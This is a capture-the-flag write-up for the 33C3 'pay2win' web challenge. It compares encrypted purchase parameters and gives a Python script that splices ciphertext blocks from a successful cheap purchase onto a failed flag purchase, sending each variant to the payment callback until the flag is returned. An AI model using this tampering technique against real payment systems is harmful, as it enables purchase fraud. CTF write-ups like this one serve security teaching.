## pay2win (Web-200)

> Writeup by rnehra01(Ravinder Nehra)

### Description
Do you have enough money to buy the flag?

### Solution
So the challenge was an easy one. `Cheap` can be bought by entering a valid credit card but purchase failed for `flag`. After looking at the challenge for a very long time, `data` parameter in the URL looked suspicious.

[`data` during buying of `flag`]
```
f1=5e4ec20070a567e0e3408e92be677178ee8cbd062a60582b4f75c9736d3b8e0641e7995bb92506da1ac7f8da5a628e19ae39825a916d8a2f
f2=5e4ec20070a567e0e3408e92be677178d238c1d6d01839664f75c9736d3b8e0641e7995bb92506da1ac7f8da5a628e19ae39825a916d8a2f 
```
[`data` contents during buying of `cheap`]
```
c1=5e4ec20070a567e0e3408e92be6771789c68e186a73ad0df3b5b0554edda4f8828df361f896eb3c3706cda0474915040
c2=5e4ec20070a567e0e3408e92be677178ae6633fbd9d624ff3b5b0554edda4f8828df361f896eb3c3706cda0474915040
c3=5e4ec20070a567e0e3408e92be677178a1e8f028a2ce7c2a3b5b0554edda4f8828df361f896eb3c3706cda0474915040
```
[`data` contents after failed purchase]
```
ff1=232c66210158dfb23a2eda5cc945a0a9650c1ed0fa0a08f661c6c60fea312a3de871eef719f5fde02f7ef761e2bbe791
ff2=232c66210158dfb23a2eda5cc945a0a9650c1ed0fa0a08f661c6c60fea312a3d272d81aff52de2a52f7ef761e2bbe791
```
[`data` contents after successful purchase]
```
cp1=5765679f0870f4309b1a3c83588024d7c146a4104cf9d2c8dca8a210beb51eda28df361f896eb3c3706cda0474915040
cp2=5765679f0870f4309b1a3c83588024d7c146a4104cf9d2c86117e55fc22ad33f28df361f896eb3c3706cda0474915040
cp3=5765679f0870f4309b1a3c83588024d7c146a4104cf9d2c81f381a6fcd665bdb28df361f896eb3c3706cda0474915040
```

So, three successful purhases of `cheap` gave same prefix and prefix changed in unsuccessful purchase.
Also suffix of `c1` and `cp1` are same, so most probably they contain information about `product name` and suffix contain `purchase status` 

Initially I tried to decode the data contents but got no luck.
So I just tried to brute-force the prefix using the script.

```
import requests

#failed purchase for flag
ff='232c66210158dfb23a2eda5cc945a0a9650c1ed0fa0a08f661c6c60fea312a3d272d81aff52de2a52f7ef761e2bbe791'
#good purchase for cheap
cp='5765679f0870f4309b1a3c83588024d7c146a4104cf9d2c8dca8a210beb51eda28df361f896eb3c3706cda0474915040'

url = 'http://78.46.224.78:5000/payment/callback?data='

for i in range(0,50):
	data = cp[:i]+ff[i:]
	print 'Trying : ',url+data
	r=requests.get(url+data)
	
	if (r.status_code == 200):
		print r.text
		if ('flag' in r.text):
			break
```

And got the flag at `http://78.46.224.78:5000/payment/callback?data=5765679f0870f4309b1a3c83588024d7650c1ed0fa0a08f661c6c60fea312a3d272d81aff52de2a52f7ef761e2bbe791`

Flag : `33C3_3c81d6357a9099a7c091d6c7d71343075e7f8a46d55c593f0ade8f51ac8ae1a8`
